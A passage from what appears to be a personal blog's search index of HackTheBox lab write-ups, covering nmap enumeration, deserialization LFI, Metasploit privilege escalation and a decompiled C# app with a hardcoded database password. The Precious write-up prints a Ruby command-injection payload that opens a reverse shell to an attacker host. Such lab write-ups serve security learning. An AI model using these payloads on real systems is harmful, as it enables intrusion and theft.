DateTime.Now.ToString(\u0026#34;h:mm:ss\u0026#34;); } public class Orders { private string order_filename; private string order_info; private File file = new File(); public object RemoveOrder { get; set; } public string WriteOrder { get { return file.WriteFile; } set { order_info = value; file.WriteFile = order_info; } } public string ReadOrder { get { return file.ReadFile; } set { order_filename = value; order_filename = order_filename.Replace(\u0026#34;/\u0026#34;, \u0026#34;\u0026#34;); order_filename = order_filename.Replace(\u0026#34;..\u0026#34;, \u0026#34;\u0026#34;); file.ReadFile = order_filename; } } } public class File { private string file_content; private string IsSuccess = null; private string directory = \u0026#34;/opt/bagel/orders/\u0026#34;; private string filename = \u0026#34;orders.txt\u0026#34;; public string ReadFile { get { return file_content; } set { filename = value; ReadContent(directory + filename); } } public string WriteFile { get { return IsSuccess; } set { WriteContent(directory + filename, value); } } public void ReadContent(string path) { try { IEnumerable\u0026lt;string\u0026gt; values = System.IO.File.ReadLines(path, Encoding.UTF8); file_content += string.Join(\u0026#34;\\n\u0026#34;, values); } catch (Exception) { file_content = \u0026#34;Order not found!\u0026#34;; } } public void WriteContent(string filename, string line) { try { System.IO.File.WriteAllText(filename, line); IsSuccess = \u0026#34;Operation successed\u0026#34;; } catch (Exception) { IsSuccess = \u0026#34;Operation failed\u0026#34;; } } } public class DB { [Obsolete(\u0026#34;The production team has to decide where the database server will be hosted. This method is not fully implemented.\u0026#34;)] public void DB_connection() { //IL_0008: Unknown result type (might be due to invalid IL or missing references) //IL_000e: Expected O, but got Unknown string text = \u0026#34;Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K\u0026#34;; SqlConnection val = new SqlConnection(text); string text2 = \u0026#34;INSERT INTO orders (Name,Address,Count,Type) VALUES (\u0026#39;Eliot\u0026#39;,\u0026#39;Street\u0026#39;,4,\u0026#39;Baggel\u0026#39;)\u0026#34;; } } } Okay, this was the most challenging part After scrolling through code my intuition was telling me that we can exploit deserialization Found hacktricks, systemweakness and exploit-notes.hdks.org articles The hints from the HTB forum gave me confidence that I was on the right path So I started playing around with different tools recommended in the hacktricks article that could be helpful in exploiting No luck with RCE So I knew my approach was wrong maybe I started reading other articles and systemweakness article was really helpful So we know we have a function that is responsible for deserialization Now I need to find canditates according to the article And we have one in Orders class named RemoveOrder We know we can deploy LFI based on exploit-notes.hdks.org We have a File class that we can use to achieve our goals We use File\u0026rsquo;s ReadFile and set the value to the file we want to read I started crafting payload based on the examples given in articles above and succeded Thus I didn\u0026rsquo;t fully understand the whole magic behind the exploitation and didn\u0026rsquo;t have a whole picture of exploit chain in the source code I suggest you to read 0xdf\u0026rsquo;s explanation, he has a nice exploitation map of this deserialization part Since the dll is running by a different user, we could probably read their ssh keys Let\u0026rsquo;s craft the payload to read id_rsa And we get phil's key Use the connect to the box and we get a foothold User Now we saw that there is another user: developer Let\u0026rsquo;s try the password that was stored in DB class, that we saw during decompilation Root After privescing to developer The first thing I always check is sudo rights developer can execute dotnet as root Check GTFOBins And we have a root I will check other writeups to paint the whole picture of the deserialization part since I solved it blindly So please check other writeups ","date":"June 3, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/bagel/images/bagel.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/bagel/","summary":"Bagel Enumeration nmap └─$ nmap -p22,5000,8000 -sC -sV -Pn 10.10.11.201 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 19:15 BST Nmap scan report for 10.10.11.201 (10.10.11.201) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.8 (protocol 2.0) | ssh-hostkey: | 256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA) |_ 256 80a7cd10e72fdb958b869b1b20652a98 (ED25519) 5000/tcp open upnp? | fingerprint-strings: | GetRequest: | HTTP/1.1 400 Bad Request | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:19 GMT | Connection: close | HTTPOptions: | HTTP/1.","tags":["HTB"],"title":"[HTB] Machine: Bagel"},{"categories":null,"contents":"Optimum Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.8 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 19:02 BST Nmap scan report for 10.10.10.8 (10.10.10.8) Host is up (0.091s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.60 seconds Web server We see the version and the application running HttpFileServer 2.3 Let\u0026rsquo;s google Foothold/User Let\u0026rsquo;s copy an exploit and run I started Http server and hosted shell.ps1 And we get a shell Root Let\u0026rsquo;s start enumerating for privesc systeminfo PS C:\\Users\\kostas\\Downloads\u0026gt; systeminfo Host Name: OPTIMUM OS Name: Microsoft Windows Server 2012 R2 Standard OS Version: 6.3.9600 N/A Build 9600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00252-70000-00000-AA535 Original Install Date: 18/3/2017, 1:51:36 ?? System Boot Time: 9/6/2023, 5:55:25 ?? System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 1 Processor(s) Installed. [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: el;Greek Input Locale: en-us;English (United States) Time Zone: (UTC+02:00) Athens, Bucharest Total Physical Memory: 4.095 MB Available Physical Memory: 3.481 MB Virtual Memory: Max Size: 5.503 MB Virtual Memory: Available: 4.932 MB Virtual Memory: In Use: 571 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: \\\\OPTIMUM Hotfix(s): 31 Hotfix(s) Installed. [01]: KB2959936 [02]: KB2896496 [03]: KB2919355 [04]: KB2920189 [05]: KB2928120 [06]: KB2931358 [07]: KB2931366 [08]: KB2933826 [09]: KB2938772 [10]: KB2949621 [11]: KB2954879 [12]: KB2958262 [13]: KB2958263 [14]: KB2961072 [15]: KB2965500 [16]: KB2966407 [17]: KB2967917 [18]: KB2971203 [19]: KB2971850 [20]: KB2973351 [21]: KB2973448 [22]: KB2975061 [23]: KB2976627 [24]: KB2977629 [25]: KB2981580 [26]: KB2987107 [27]: KB2989647 [28]: KB2998527 [29]: KB3000850 [30]: KB3003057 [31]: KB3014442 Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) 82574L Gigabit Network Connection Connection Name: Ethernet0 DHCP Enabled: No IP address(es) [01]: 10.10.10.8 Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed. Sherlock.ps1 This tool is Deprecated. Have a look at Watson instead. So we can either try Watson or Sherlock I tried precompiled Watson, it didn\u0026rsquo;t work. Need to compile it myself next time So I used Sherlock PS C:\\Users\\kostas\\Downloads\u0026gt; import-module .\\sherlock.ps1 PS C:\\Users\\kostas\\Downloads\u0026gt; Find-AllVulns Title : User Mode to Ring (KiTrap0D) MSBulletin : MS10-015 CVEID : 2010-0232 Link : https://www.exploit-db.com/exploits/11199/ VulnStatus : Not supported on 64-bit systems Title : Task Scheduler .XML MSBulletin : MS10-092 CVEID : 2010-3338, 2010-3888 Link : https://www.exploit-db.com/exploits/19930/ VulnStatus : Not Vulnerable Title : NTUserMessageCall Win32k Kernel Pool Overflow MSBulletin : MS13-053 CVEID : 2013-1300 Link : https://www.exploit-db.com/exploits/33213/ VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenuEx Win32k NULL Page MSBulletin : MS13-081 CVEID : 2013-3881 Link : https://www.exploit-db.com/exploits/31576/ VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenu Win32k Null Pointer Dereference MSBulletin : MS14-058 CVEID : 2014-4113 Link : https://www.exploit-db.com/exploits/35101/ VulnStatus : Not Vulnerable Title : ClientCopyImage Win32k MSBulletin : MS15-051 CVEID : 2015-1701, 2015-2433 Link : https://www.exploit-db.com/exploits/37367/ VulnStatus : Not Vulnerable Title : Font Driver Buffer Overflow MSBulletin : MS15-078 CVEID : 2015-2426, 2015-2433 Link : https://www.exploit-db.com/exploits/38222/ VulnStatus : Not Vulnerable Title : \u0026#39;mrxdav.sys\u0026#39; WebDAV MSBulletin : MS16-016 CVEID : 2016-0051 Link : https://www.exploit-db.com/exploits/40085/ VulnStatus : Not supported on 64-bit systems Title : Secondary Logon Handle MSBulletin : MS16-032 CVEID : 2016-0099 Link : https://www.exploit-db.com/exploits/39719/ VulnStatus : Appears Vulnerable Title : Windows Kernel-Mode Drivers EoP MSBulletin : MS16-034 CVEID : 2016-0093/94/95/96 Link : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1 6-034? VulnStatus : Appears Vulnerable Title : Win32k Elevation of Privilege MSBulletin : MS16-135 CVEID : 2016-7255 Link : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S ample-Exploits/MS16-135 VulnStatus : Appears Vulnerable Title : Nessus Agent 6.6.2 - 6.10.3 MSBulletin : N/A CVEID : 2017-7199 Link : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h tml VulnStatus : Not Vulnerable I also ran wesng There were a lot of CVEs So I thought maybe I should try metasploit's local exploit suggester Created msfvenom payload for meterpreter Started msfconsole and ran multi/handler Uploaded and ran msfvenom payload from the shell we got before And booted exploit suggester We see MS16-032 Which was in Sherlock's output So I tried running it before, but had luck Upon further investigation, exploit-db exploit won\u0026rsquo;t work since it spawns the new window So I tried running metasploit's version of MS16-032 exploit Check ippsec\u0026rsquo;s video or 0xdf\u0026rsquo;s writetup regaring the MS16-032, they used Empire's version of MS16-032 script ","date":"June 3, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/optimum/images/optimum.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/optimum/","summary":"Optimum Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.8 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 19:02 BST Nmap scan report for 10.10.10.8 (10.10.10.8) Host is up (0.091s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.","tags":["HTB"],"title":"[HTB] Machine: Optimum"},{"categories":null,"contents":"Arctic Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV 10.10.10.11 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 16:05 BST Nmap scan report for 10.10.10.11 (10.10.10.11) Host is up (0.093s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 8500/tcp open fmtp? 49154/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 148.92 seconds Only 3 ports are open Let\u0026rsquo;s check port 8500 I opened using browser After scavenging through directories, we can see interesting path We see the version and the application running After googling a bit, we can see there is a vulnerability Foothold/User So let\u0026rsquo;s try exploiting application I used CVE-2009-2265, since provides a nice description of the exploit And we get a foothold and user Root Let\u0026rsquo;s try escalating our privileges There are different ways to approach this We can use wesng Beware of the huge output from the tool Or since it\u0026rsquo;s an old box, I thought it was intended to be solved using metasploit Maybe I am wrong Download meterpreter payload generated by msfvenom And get a meterpreter shell Then we run exploit suggester We get a bunch of results Then we try running each one with a hope that we get privileged access Or you can try other kernel exploits available in this box But since it was an old box, I tried running MS10-092 I had no success (even tried doing it manually), maybe it was metasploit version problem or something else (the box was laggy and I had connection issues) You can check ippsec\u0026rsquo;s writeup, who solved it using the same vulnerability with success ","date":"May 25, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/arctic/images/arctic.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/arctic/","summary":"Arctic Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV 10.10.10.11 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 16:05 BST Nmap scan report for 10.10.10.11 (10.10.10.11) Host is up (0.093s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 8500/tcp open fmtp? 49154/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.","tags":["HTB"],"title":"[HTB] Machine: Arctic"},{"categories":null,"contents":"Devel Enumeration Nmap ──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 15:56 BST Nmap scan report for 10.10.10.5 (10.10.10.5) Host is up (0.094s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 02:06AM \u0026lt;DIR\u0026gt; aspnet_client | 03-17-17 05:37PM 689 iisstart.htm |_03-17-17 05:37PM 184946 welcome.png | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 7.5 |_http-server-header: Microsoft-IIS/7.5 |_http-title: IIS7 | http-methods: |_ Potentially risky methods: TRACE Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.90 seconds nmap reveals that Anonymous FTP login allowed and we see the content Let\u0026rsquo;s check ftp manually We see that the content is hosted by the http server Let\u0026rsquo;s see if we can upload the files to ftp And we get a webshell Foothold \u0026amp; Root So I decided to use metasploit in this case, since it has built-in exploit suggester So I have to upload meterpreter shell payload generated by msfvenom After getting access, I ran exploit suggester We can\u0026rsquo;t use first option, since it seems like it\u0026rsquo;s used when you want to elevate and bypass UAC So We use the next option Set the options, run the exploit and get NT Autority\\System I suggest checking 0xdf\u0026rsquo;s writeup He provides another approach for privesc ","date":"May 25, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/devel/images/devel.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/devel/","summary":"Devel Enumeration Nmap ──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 15:56 BST Nmap scan report for 10.10.10.5 (10.10.10.5) Host is up (0.094s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 02:06AM \u0026lt;DIR\u0026gt; aspnet_client | 03-17-17 05:37PM 689 iisstart.htm |_03-17-17 05:37PM 184946 welcome.png | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 7.","tags":["HTB"],"title":"[HTB] Machine: Devel"},{"categories":null,"contents":"Legacy Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV 10.10.10.4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 18:11 BST Nmap scan report for 10.10.10.4 (10.10.10.4) Host is up (0.17s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_smb2-time: Protocol negotiation failed (SMB2) |_clock-skew: mean: 5d00h27m11s, deviation: 2h07m16s, median: 4d22h57m11s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 005056b90f40 (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2023-06-04T22:09:21+03:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 62.71 seconds Nmap vulnerability scripts ┌──(kali㉿kali)-[~] └─$ nmap -Pn -p139,445,135 --script *vuln* 10.10.10.4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 18:17 BST Nmap scan report for 10.10.10.4 (10.10.10.4) Host is up (0.11s latency). PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug) | smb-vuln-ms08-067: | VULNERABLE: | Microsoft Windows system vulnerable to remote code execution (MS08-067) | State: VULNERABLE | IDs: CVE:CVE-2008-4250 | The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, | Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary | code via a crafted RPC request that triggers the overflow during path canonicalization. | | Disclosure date: 2008-10-23 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250 |_ https://technet.microsoft.com/en-us/library/security/ms08-067.aspx | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ |_ https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED |_smb-vuln-ms10-054: false Nmap done: 1 IP address (1 host up) scanned in 29.43 seconds Right away it states that it\u0026rsquo;s vulnerable to MS08-067 https://www.exploit-db.com/exploits/7104 Root Let\u0026rsquo;s run metasploit and execute an exploit I was lazy to search for a Github exploit And we have an access as LEGACY$ machine account ","date":"May 25, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/legacy/images/legacy.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/legacy/","summary":"Legacy Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV 10.10.10.4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 18:11 BST Nmap scan report for 10.10.10.4 (10.10.10.4) Host is up (0.17s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_smb2-time: Protocol negotiation failed (SMB2) |_clock-skew: mean: 5d00h27m11s, deviation: 2h07m16s, median: 4d22h57m11s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 005056b90f40 (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2023-06-04T22:09:21+03:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Service detection performed.","tags":["HTB"],"title":"[HTB] Machine: Legacy"},{"categories":null,"contents":"Lame Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV 10.10.10.3 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 17:14 BST Nmap scan report for 10.10.10.3 (10.10.10.3) Host is up (0.10s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.16.3 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status |_ftp-anon: Anonymous FTP login allowed (FTP code 230) 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA) |_ 2048 5656240f211ddea72bae61b1243de8f3 (RSA) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_smb2-time: Protocol negotiation failed (SMB2) | smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian) | Computer name: lame | NetBIOS computer name: | Domain name: hackthebox.gr | FQDN: lame.hackthebox.gr |_ System time: 2023-05-30T12:14:42-04:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: 1h59m54s, deviation: 2h49m43s, median: -6s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 63.17 seconds Checked SMB After googling, found a vulnerable FTP version Checked SMB version Googling revealed Username map script Since I am trying not to use Metasploit, I searched for exploit and found one on github Root Let\u0026rsquo;s run exploit and get foothold Got reverse shell Let\u0026rsquo;s check user Oh, we are root ","date":"May 23, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/lame/images/lame.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/lame/","summary":"Lame Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV 10.10.10.3 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 17:14 BST Nmap scan report for 10.10.10.3 (10.10.10.3) Host is up (0.10s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.16.3 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.","tags":["HTB"],"title":"[HTB] Machine: Lame"},{"categories":null,"contents":"Precious Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV -T4 10.10.11.189 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 11:09 EDT Nmap scan report for 10.10.11.189 (10.10.11.189) Host is up (0.14s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 845e13a8e31e20661d235550f63047d2 (RSA) | 256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA) |_ 256 33053dcd7ab798458239e7ae3c91a658 (ED25519) 80/tcp open http nginx 1.18.0 |_http-title: Did not follow redirect to http://precious.htb/ |_http-server-header: nginx/1.18.0 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 28.35 seconds Let\u0026rsquo;s check port 80 It\u0026rsquo;s a service that converts Web Pages to PDF Let\u0026rsquo;s supply anything and see what it returns I am running Burp Suite in the background So after supplying any url, we receive a pdf So I tried figuring out the backend service, or library that was responsible for conversion I took the response data from Burp Suite and used Cyber Chef to decode it We see the package and it\u0026rsquo;s version After a little bit of googling Let\u0026rsquo;s test it I set up tcpdump to listen to ICMP Success Let\u0026rsquo;s get a foothold Foothold I used revshells.com to create a payload for Ruby (It was revealed in Burp Suite responses and pdfkit is a Ruby package) http://10.10.16.37:8000/index.html?p=#{\u0026#39;%20`ruby -rsocket -e\u0026#39;spawn(\u0026#34;sh\u0026#34;,[:in,:out,:err]=\u0026gt;TCPSocket.new(\u0026#34;10.10.16.37\u0026#34;,6666))\u0026#39;`\u0026#39;} Try the payload And We get a reverse shell Now we need to privesc After running the linpeas.sh We see that we have another user ╔══════════╣ Users with console henry❌1000:1000:henry,,,:/home/henry:/bin/bash root❌0:0:root:/root:/bin/bash ruby❌1001:1001::/home/ruby:/bin/bash User After checking the home directory of the ruby user I found henry credentials And su to henry Let\u0026rsquo;s get root Root The first thing I check is sudo privileges And we get a result Let\u0026rsquo;s check the file According to the comments, the script loads the list of dependencies from the dependencies.yaml and compares them to the ones already installed After googling We find that there is a yaml injection or https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Insecure%20Deserialization/YAML/#pyyaml Check the version So let\u0026rsquo;s try Firstly, it seems like the script searches for dependencies.yaml file in the directory where we execute the command So we can create dependencies.yaml anywhere where we have the privileges to do so Copy the payload from the links above Run the command And we get our flag ","date":"May 20, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/precious/images/precious.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/precious/","summary":"Precious Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV -T4 10.10.11.189 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 11:09 EDT Nmap scan report for 10.10.11.189 (10.10.11.189) Host is up (0.14s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 845e13a8e31e20661d235550f63047d2 (RSA) | 256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA) |_ 256 33053dcd7ab798458239e7ae3c91a658 (ED25519) 80/tcp open http nginx 1.","tags":["HTB"],"title":"[HTB] Machine: Precious"},{"categories":null,"contents":"This section will contain Game Hacking notes and materials. Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel ","date":"April 22, 2023","hero":"/posts/cybersecurity/game-hacking/overview/images/gh.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/game-hacking/overview/","summary":"This section will contain Game Hacking notes and materials. Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel ","tags":["Guided Hacking","Game Hacking"],"title":"[Game Hacking] Overview"},{"categories":null,"contents":"This section will contain HTB notes, solutions and materials. Checkout official HTB website You can also checkout ippsec\u0026rsquo;s youtube channel or website, 0xdf\u0026rsquo;s youtube channel or website More links will be added\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/hackthebox/overview/images/htb.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/overview/","summary":"This section will contain HTB notes, solutions and materials. Checkout official HTB website You can also checkout ippsec\u0026rsquo;s youtube channel or website, 0xdf\u0026rsquo;s youtube channel or website More links will be added\u0026hellip; ","tags":["HTB"],"title":"[HTB] Overview"},{"categories":null,"contents":"This section will contain Active Directory notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/active_directory/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/active_directory/","summary":"This section will contain Active Directory notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Active Directory"],"title":"[Pentesting] Active Directory"},{"categories":null,"contents":"This section will contain Attacking Services notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/attacking_services/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/attacking_services/","summary":"This section will contain Attacking Services notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Attacking Services"],"title":"[Pentesting] Attacking Services"},{"categories":null,"contents":"This section will contain File Transfers notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/file_transfers/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/file_transfers/","summary":"This section will contain File Transfers notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["File Transfers"],"title":"[Pentesting] File Transfers"},{"categories":null,"contents":"This section will contain Footprinting and Enumeration notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/footprinting_and_enumeration/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/footprinting_and_enumeration/","summary":"This section will contain Footprinting and Enumeration notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Footprinting and Enumeration"],"title":"[Pentesting] Footprinting and Enumeration"},{"categories":null,"contents":"This section will contain Linux Privilege Escalation notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 